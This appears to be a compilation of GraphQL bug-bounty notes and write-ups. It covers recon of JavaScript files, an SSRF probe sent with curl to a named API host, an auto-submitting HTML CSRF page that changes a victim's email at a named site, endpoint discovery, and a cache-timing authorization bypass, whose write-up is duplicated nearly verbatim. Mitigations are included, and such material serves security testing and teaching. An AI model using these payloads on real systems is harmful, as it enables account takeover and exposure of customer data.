
## 🔍 Extracting GraphQL Operations Without Introspection

When GraphQL introspection is blocked, you can still uncover valuable query and mutation names by analyzing JavaScript files from the target site.

### 🧰 Step-by-Step:

1. **📥 Download JavaScript files**
    
    
    ```bash
    mkdir js_files
    # Use tools like:
    waybackurls target.com | grep '\.js' | uniq | wget -i - -P js_files
    ```
    
2. **🔎 Extract raw GraphQL operations**
    
    ```bash
    grep -Eo 'query [a-zA-Z0-9_]+\(|mutation [a-zA-Z0-9_]+\(' js_files -R
    ```
    
3. **🧼 Clean and deduplicate query/mutation names**

```bash
grep -Eo 'query [a-zA-Z0-9_]+\(|mutation [a-zA-Z0-9_]+\(' js_files -R \
| cut -d' ' -f2 | cut -d'(' -f1 | sort -u
```

**🔍 Search for where each operation is used** Replace `<query_name>` with names from the list:

```bash
grep -Ri '<query_name>' js_files/
```

**This technique is usefull for reconstructing GraphQL Schemas.**

### 🧠 What's Actually Happening:

You're using the **target domain** (e.g., `target.com`) as the input to collect archived `.js` files from services like the Wayback Machine. These JavaScript files often contain the actual front-end GraphQL operations — like:

```http
query getUser($id: ID!) {
  user(id: $id) {
    name
  }
}

```

So after the recon it gives you something like:

```
getUser
getCart
createOrder

```

Then you'd search like:

```
grep -Ri 'getUser' js_files/
grep -Ri 'createOrder' js_files/

```

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
### How a Researcher Found a Critical SSRF Bug in *****

A fellow researcher discovered a critical Server-Side Request Forgery (**SSRF**) vulnerability in a **GraphQL** endpoint of *****. This issue allowed attackers to make the server send arbitrary GET requests to external or internal domains. Let's dive into how it was discovered.

### The Bug: SSRF in the `allTicks` GraphQL Query

The issue lies in the `source` parameter of the `allTicks` query. This parameter accepts a URL and uses it to make server-side GET requests. The server failed to restrict or validate the URLs, leading to SSRF.

Here's how the bug was found:

1. **Identify the GraphQL Endpoint** The researcher noticed that the **`allTicks`** query allowed a `source` parameter to be passed as a URL.
2. **Test for External Requests** By replacing the legitimate URL with a Burp Collaborator domain, the researcher confirmed the server made GET requests to the specified domain. Here's an example query:

```graphql
query {  
    allTicks(symbol: "TSLA", source: "https://[COLLABORATOR_DOMAIN]/") {  
        symbol  
        server  
        source  
        ask  
        time  
        bid  
    }  
}
```

![None](https://miro.medium.com/v2/resize:fit:700/1*4PeNNPSj7kqfQuhJq-pQeg.png)

Alternatively, using `curl`:

```bash
curl -v "https://pwapi.ex2b.com/" -H "Content-Type: application/json" --data '{"query":"query { allTicks(symbol:\"TSLA\", source:\"https://[COLLABORATOR_DOMAIN]/\"){ symbol server source ask time bid } }"}'
```

**3. Monitor Incoming Requests** The researcher observed incoming DNS and HTTP requests to the Burp Collaborator server, confirming the vulnerability.

**4. Exploit with GET Parameters** The `source` parameter could include GET parameters, allowing attackers to manipulate server requests further:

```graphql
query {  
    allTicks(symbol: "TSLA", source: "https://[COLLABORATOR_DOMAIN]/?do=something&") {  
        symbol  
        server  
        source  
        ask  
        time  
        bid  
    }  
}
```

5. **Internal Network Access** By replacing the URL with an internal IP, the researcher demonstrated access to internal network services.

### Why This Is Serious

This SSRF vulnerability has significant implications:

1. **Internal Network Probing**: Attackers can discover open ports and services within the internal network.
2. **Blind HTTP Requests**: Although responses weren't returned, attackers could gather valuable information by performing blind HTTP GET requests.
3. **Potential Escalation**: Information gained through SSRF could lead to more severe vulnerabilities in internal services.

### Vulnerability Details

- **Researcher**: [kirtixs]
- **Vulnerability Type**: Server-Side Request Forgery (SSRF)
- **Affected Functionality**: `allTicks` GraphQL Query
- **Severity**: High

![None](https://miro.medium.com/v2/resize:fit:700/1*O7Hd1rZ0xxVpmCOT8-hXSw.png)

**This case highlights the importance of validating user inputs, especially when they influence server-side requests. For bug bounty hunters, always test for SSRF in APIs, particularly in parameters that accept URLs.**

---

>[send  a request to the Author on linkedin for collabs?](https://www.linkedin.com/in/facufernandez)

# Intro

Cross-Site Request Forgery (CSRF) is a well-known web vulnerability that allows attackers to execute unauthorized actions on behalf of authenticated users. While CSRF is commonly associated with traditional web applications, **GraphQL APIs are also susceptible** to CSRF attacks under certain conditions.

This article will walk you through:

- The fundamentals of CSRF.
- How GraphQL can be exploited using CSRF.
- A **CSRF PoC** to exploit a vulnerable GraphQL API.
- The most common cases of CSRF and how to prevent them.


# Understanding CSRF

CSRF occurs when an attacker forces an~={orange} authenticated user to send an unintended request to a web application. =~Since the request is **automatically authenticated via cookies**, the action is performed as if the user had initiated it themselves.

# Common Applications Vulnerable to CSRF

1. **Banking and Financial Apps** — Transferring funds, changing user settings.
2. **E-commerce Sites** — Modifying user information, adding/removing items from carts.
3. **Social Media Platforms** — Sending messages, changing profile information.
4. **Admin Panels & CMS** — Modifying users, changing security settings.
5. **GraphQL APIs** — Changing email, passwords, or other sensitive information.

# Exploiting GraphQL CSRF

Unlike traditional REST APIs, **GraphQL accepts complex queries in JSON format**, often requiring `Content-Type: application/json`. However, if the GraphQL endpoint does not implement CSRF protections such as **CSRF tokens** or **SameSite cookie policies**, attackers can still abuse authenticated users.

# The GraphQL CSRF Proof-of-Concept (PoC)

Below is an HTML **CSRF attack** that attempts to change the email address of an authenticated user.


```html
<!DOCTYPE html>  
<html>  
  
<body>  
    <form id="csrfForm" action="https://indeed.com/graphql/v1" method="POST">  
        <input type="hidden" name="query" value="  
        mutation changeEmail($input: ChangeEmailInput!) {  
          changeEmail(input: $input) {  
            email  
          }  
        }  
      ">  
        <input type="hidden" name="operationName" value="changeEmail">  
        <input type="hidden" name="variables" value='{"input":{"email":"hacker@hackerone.com"}}'>  
    </form>  
  
    <script>        document.getElementById("csrfForm").submit(); // Auto-submit when victim visits the page    </script>  
</body>  
  
</html>
```

# How This Works

1. **An authenticated user visits the attacker’s webpage**.
2. The form **auto-submits**, sending a POST request to the target GraphQL API.
3. Since the user is **already authenticated**, their browser includes their session cookies.
4. If no **CSRF protections** are in place, the attack **successfully changes the email**.

# Why Some GraphQL APIs Are Vulnerable to CSRF

1. **They rely solely on cookies for authentication** — When the browser sends requests with stored cookies, CSRF can be exploited.
2. **They don’t implement CSRF tokens** — No `X-CSRF-Token` means no verification that the request originated from a legitimate page.
3. **They allow cross-origin requests** — If `Access-Control-Allow-Origin: *` is set, ~={red}CORS protections are ineffective.=~
4. **They don’t enforce** `**SameSite**` **attributes on cookies** – `SameSite=None` cookies allow cross-site requests.

# Mitigation Strategies

To prevent CSRF attacks in GraphQL APIs, developers should implement the following best practices:

## 1. Use CSRF Tokens

Require a **unique** token in each request and validate it on the server.

## 2. Implement `SameSite` Cookies

Set cookies with:

```css
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
```

This prevents cookies from being sent in **cross-site** requests.

## 3. Require Custom Headers for API Requests

GraphQL APIs should enforce the presence of a custom header:

```css
X-Requested-With: XMLHttpRequest
```

This prevents requests from being sent via simple HTML forms.

## 4. Use CORS with Credential Restrictions

Limit cross-origin access with strict CORS policies:

```css
Access-Control-Allow-Origin: https://trusted-site.com  
Access-Control-Allow-Credentials: true
```

This ensures that only trusted origins can send authenticated requests.

## 5. Implement User Authentication Re-verification

For sensitive actions like changing emails or passwords, require the user to **re-enter their password**.

-----

<iframe width="928" height="522" src="https://www.youtube.com/embed/fL9fsFU5LP0?list=PL4wZd4YK_64Fu9kii0UUBFE7RHfMdT5sc" title="Accessing Private GraphQL Fields" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
<iframe width="928" height="522" src="https://www.youtube.com/embed/r-O5aok8TeM" title="Bypassing GraphQL Brute-Force Protections" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

## Finding a Hidden GraphQL Endpoint

> As GraphQL gains popularity for its flexibility and powerful data-fetching capabilities, it also becomes an attractive target for attackers. Unlike traditional REST APIs that have clearly defined endpoints, GraphQL uses a single endpoint to handle all queries. This design choice opens up new security challenges, particularly when it comes to discovering and exploiting hidden GraphQL endpoints.

> We'll explore how attackers can find hidden GraphQL endpoints, what risks these endpoints pose, and how organizations can secure their GraphQL implementations.

### Understanding GraphQL Vulnerabilities

GraphQL simplifies API interactions by providing a schema that allows clients to request exactly the data they need. While this improves efficiency, **it can also lead to the exposure of sensitive data if proper security measures are not in place.**

In particular, hidden GraphQL endpoints can be used by attackers to:

- **Bypass access controls**: Poorly configured permissions can allow unauthorized access to sensitive information.
- **Perform Denial of Service (DoS)**: GraphQL queries can be deeply nested or complex, leading to potential resource exhaustion.
- **Data enumeration**: Attackers may enumerate types, fields, and even the underlying structure of an application by inspecting the schema.

However, the first step for attackers is often to **find the GraphQL endpoint** itself. If it's hidden or obfuscated, this can delay detection, but it doesn't guarantee security.

### How Attackers Find Hidden GraphQL Endpoints

6. **Common Endpoint Names**: By default, many GraphQL implementations use common names for their endpoints, such as `/graphql`, `/api/graphql`, or `/v1/graphql`. Attackers often start by brute-forcing commonly used GraphQL endpoint names across various URL paths.
7. **Web Application Reconnaissance**: Attackers can inspect the JavaScript code of a web application, especially single-page applications (SPAs), for clues. Front-end frameworks like React, Angular, or Vue often rely on API calls to GraphQL. By analyzing network traffic or JavaScript source code, attackers can identify the endpoint.
8. **GraphiQL Interface**: Some developers leave the GraphiQL interface (an in-browser tool for testing GraphQL queries) exposed in production environments. This interface makes it easier for attackers to explore the GraphQL API and its schema. Attackers might find it at paths like `/graphiql` or `/playground`.
9. **Crawling and Fuzzing Tools**: Automated tools like Burp Suite or OWASP ZAP can crawl web applications and identify GraphQL endpoints by monitoring HTTP responses for patterns specific to GraphQL. For example, a successful GraphQL query will usually return JSON-formatted data with fields like `"data"` or `"errors"`.
10. **HTTP Request Analysis**: Attackers can examine HTTP requests and responses for clues. GraphQL responses typically contain a `Content-Type: application/json` header and a response body structured with fields like `data`, `query`, or `variables`. This provides hints that a GraphQL endpoint is being used behind the scenes.

### Risks of Exposed GraphQL Endpoints

Once attackers discover a GraphQL endpoint, they can begin probing it for vulnerabilities. Some common attack scenarios include:

11. **Introspection Query Abuse**: If introspection queries are enabled, an attacker can fetch the entire schema of the API, which includes types, fields, and relationships. This knowledge allows them to craft highly targeted attacks, exposing sensitive functionality that was meant to remain hidden.
12. **Insecure Object-Level Authorization**: GraphQL APIs often use object-based authorization, where access to certain fields or operations is restricted based on the user's permissions. If this is misconfigured, an attacker can access sensitive information by querying fields they shouldn't be able to see.
13. **Mass Assignment**: GraphQL allows clients to specify which fields they want to query. If the API is not carefully designed, attackers may be able to manipulate input fields to change object states, such as updating user roles or modifying protected data.
14. **Denial of Service (DoS) Attacks**: Attackers can craft expensive queries with deeply nested fields or complex operations that exhaust server resources, leading to DoS conditions. Some APIs may be vulnerable to query batching, where a single request contains multiple queries, further amplifying the attack.

### Mitigating Hidden GraphQL Endpoint Vulnerabilities

Securing GraphQL endpoints requires both preventive and detective measures. Here are some best practices to mitigate the risks associated with hidden GraphQL endpoints:

15. **Endpoint Obfuscation**: While not a complete defense, using non-standard or obfuscated names for GraphQL endpoints can help prevent casual discovery. However, determined attackers will still use other techniques to find them.
16. **Disable Introspection in Production**: Introspection queries should be disabled in production environments. This prevents attackers from learning the full schema and crafting targeted attacks. Introspection should be limited to development or testing environments.
17. **Implement Strong Access Controls**: Ensure that field-level and object-level authorization is properly enforced. Role-based access control (RBAC) or attribute-based access control (ABAC) should be used to restrict sensitive data.
18. **Rate Limiting and Depth Limiting**: Set limits on query depth and complexity to prevent resource-intensive operations that could lead to DoS attacks. This can be achieved by implementing query analyzers or third-party libraries that restrict the number of nested operations allowed in a single request.
19. **Schema Validation and Whitelisting**: Use schema validation tools to ensure that only valid queries reach the server. Consider implementing a query whitelisting system where only pre-approved queries are allowed to be executed.
20. **Monitor for Anomalous Behavior**: Regularly monitor your GraphQL server's logs for unusual patterns of activity, such as large numbers of failed requests, overly complex queries, or access attempts from suspicious IP addresses.

> Finding hidden GraphQL endpoints is often the first step in a targeted attack on web applications using GraphQL. While hiding endpoints provides some protection, it should never be relied upon as the primary security measure. Organizations must adopt a robust security strategy that includes proper access controls, schema validation, rate limiting, and disabling introspection to safeguard their GraphQL APIs.

----

##  Authorization bypass due to cache misconfiguration

I was testing an ecommerce site.  
It had 2 assets in scope.  
`target.com` and `admin.target.com`

`target.com` was the user facing portal where users could go and buy items.  
`admin.target.com` was basically the admin portal for sellers where they could list their items, track orders, customer info and so on.

I was testing for idors and access controls. I generally use Autorize for it.

If a lower privilege user is able to hit the admin endpoint Autorize will flag it as “bypassed” .

![](https://miro.medium.com/v2/resize:fit:598/1*4teG_skh-IEYO4In-02kwg.png)

With the normal user cookie from `target.com` placed into Autorize , i was using the `admin.target.com` to check if a normal user can access the admin endpoints.

During my testing something unusual happened.

Every time i visited the endpoint:

`https://admin.target.com/orders` , following GraphQL request was being made.

POST /graphql  
Host: admin.target.com  
  
{"operationName":"GetOrders","variables":{"shop_id":"X"},"query":"query X"}

The response contained all the order information of my shop.  
That is an expected behavior.

What was strange however is, Autorize flagged the endpoint as “bypassed” meaning that even a normal user is able to make this request and access order info of my shop.

But when i sent that request to repeater and tried to make request with user cookies it gave an error.

![](https://miro.medium.com/v2/resize:fit:627/1*2jmxXqVmi89Vkom6H_IBqg.png)

Hmmm[🤔](https://emojipedia.org/thinking-face)

autorize says bypassed , repeater says forbidden.

I assumed it to be a glitch within autorize and moved on.

For the entire week when i was testing the program, it kept happening.

Autorize kept showing the `GetOrders` endpoint as “bypassed” but when i used to send the request to repeater and test , it gave me the `403 forbidden` error.

At this point, I was certain that it isn’t an issue with Autorize, and I am just missing something.

Then it clicked.

Only difference between Autorize and Repeater was the time interval.

While they both had same cookies/token.

Autorize was making immediate call to the admin endpoint.  
Where as me making the request from repeater took some time.

To test my theory:

I made a request to `GetOrders` endpoint using admin token.

POST /graphql  
Host: admin.target.com  
Auth: Bearer admin  
  
```json
{"operationName":"GetOrders","variables":{"shop_id":"X"},"query":"query X"}
```

then immediately made the same request with user token.

POST /graphql  
Host: admin.target.com  
Auth: Bearer user  
  
```json
{"operationName":"GetOrders","variables":{"shop_id":"X"},"query":"query X"}
```

To my surprise i was able to get all the order info of that shop including customer details.

**Issue**

So what was happening is:  
The server was caching the `GetOrders` response for a very brief period of 3/4 seconds.

So if an attacker makes the request at the same time when a normal shop admin is using his admin portal, attacker is able to fetch all the order/customer info belonging to any shop just using `shop_id`.

The `shop_id` is a publicly accessible id.

**Exploit**

Create a simple bash script that will make continuous request to the `GetOrders` endpoint throughout the day

When ever the admin visits their portal , the order/customer info gets cached for a window of 3/4 seconds allowing attacker to fetch them and bypassing all access control restrictions.

**POC**

I ran my intruder making request to `GetOrders` endpoint with user token.

It gave a `403 forbidden` response initially due to access controls in place.

![](https://miro.medium.com/v2/resize:fit:627/1*wJBJmtPRZN9N3xaiZ0-xRA.png)

In the mean time i logged into `admin.target.com` as adminUser and normally visited `admin.target.com/orders`

The graphql request to `GetOrders` was made in the background on behalf of admin which was available to be cached for 3/4 seconds.

The cached response was eventually fetched by the same intruder tab that was giving 403 error just a minute earlier.

![](https://miro.medium.com/v2/resize:fit:627/1*cG_Wqg-OV2oMf8b9gnZ56Q.png)

The issue was triaged as critical and immediately resolved within hours.


---

## Authorization bypass due to cache misconfiguration

I was testing an ecommerce site.  
It had 2 assets in scope.  
`target.com` and `admin.target.com`

`target.com` was the user facing portal where users could go and buy items.  
`admin.target.com` was basically the admin portal for sellers where they could list their items, track orders, customer info and so on.

I was testing for idors and access controls. I generally use Autorize for it.

If a lower privilege user is able to hit the admin endpoint Autorize will flag it as “bypassed” .

![](https://miro.medium.com/v2/resize:fit:598/1*4teG_skh-IEYO4In-02kwg.png)

With the normal user cookie from `target.com` placed into Autorize , i was using the `admin.target.com` to check if a normal user can access the admin endpoints.

During my testing something unusual happened.

Every time i visited the endpoint:

`https://admin.target.com/orders` , following GraphQL request was being made.

```json
POST /graphql  
Host: admin.target.com  
  
{"operationName":"GetOrders","variables":{"shop_id":"X"},"query":"query X"}

```

The response contained all the order information of my shop.  
~={green}That is an expected behavior.=~

What was strange however is, Autorize flagged the endpoint as “bypassed” meaning that even a normal user is able to make this request and access order info of my shop.

But when i sent that request to repeater and tried to make request with user cookies it gave an error.

![](https://miro.medium.com/v2/resize:fit:627/1*2jmxXqVmi89Vkom6H_IBqg.png)

Hmmm[🤔](https://emojipedia.org/thinking-face)

autorize says bypassed , repeater says forbidden.

I assumed it to be a glitch within autorize and moved on.

For the entire week when i was testing the program, it kept happening.

Autorize kept showing the `GetOrders` endpoint as “bypassed” but when i used to send the request to repeater and test , it gave me the `403 forbidden` error.

At this point, I was certain that it isn’t an issue with Autorize, and I am just missing something.

Then it clicked.

~={purple}Only difference between Autorize and Repeater was the time interval.=~

While they both had same cookies/token.

Autorize was making immediate call to the admin endpoint.  
Where as me making the request from repeater took some time.

To test my theory:

I made a request to `GetOrders` endpoint using admin token.
```json

POST /graphql  
Host: admin.target.com  
Auth: Bearer admin  
  
{"operationName":"GetOrders","variables":{"shop_id":"X"},"query":"query X"}

```

then immediately made the same request with user token.

```json
POST /graphql  
Host: admin.target.com  
Auth: Bearer user  
  
{"operationName":"GetOrders","variables":{"shop_id":"X"},"query":"query X"}

```
To my surprise i was able to get all the order info of that shop including customer details.

**Issue**

So what was happening is:  
The server was caching the `GetOrders` response for a very brief period of 3/4 seconds.

So if an attacker makes the request at the same time when a normal shop admin is using his admin portal, attacker is able to fetch all the order/customer info belonging to any shop just using `shop_id`.

The `shop_id` is a publicly accessible id.

**Exploit**

Create a simple bash script that will make continuous request to the `GetOrders` endpoint throughout the day

When ever the admin visits their portal , the order/customer info gets cached for a window of 3/4 seconds allowing attacker to fetch them and bypassing all access control restrictions.

**POC**

I ran my intruder making request to `GetOrders` endpoint with user token.

It gave a `403 forbidden` response initially due to access controls in place.

![](https://miro.medium.com/v2/resize:fit:627/1*wJBJmtPRZN9N3xaiZ0-xRA.png)

In the mean time i logged into `admin.target.com` as adminUser and normally visited `admin.target.com/orders`

The graphql request to `GetOrders` was made in the background on behalf of admin which was available to be cached for 3/4 seconds.

The cached response was eventually fetched by the same intruder tab that was giving 403 error just a minute earlier.

![](https://miro.medium.com/v2/resize:fit:627/1*cG_Wqg-OV2oMf8b9gnZ56Q.png)

The issue was triaged as critical and immediately resolved within hours.

![](https://miro.medium.com/v2/resize:fit:627/1*xdG4kFdqsc5yDQFdjrOUHw.png)

![](https://miro.medium.com/v2/resize:fit:328/1*Ep0MBBalVz4v_yC67jSyMw.png)


---

https://medium.com/@omarahmed_13016/graphql-path-traversal-lead-to-disclosure-of-pii-38597b8446d4?source=post_page---author_recirc--6101fcb3d5e0----3---------------------778c3809_75cb_4dd5_8448_3b66e3cd4a7e-------


---


## GraphQL CSRF via fetch request when samesite attribute is missing in the cookie -- POC


----


https://medium.com/@hackersatty/privilege-escalation-in-graphql-exploiting-finance-role-token-to-access-admin-data-part-1-7a017a7aeb89?source=post_page---read_next_recirc--bb0f5716bbe1----0---------------------7442a0fe_d3dc_4f77_87fc_daeb44fb5e3b-------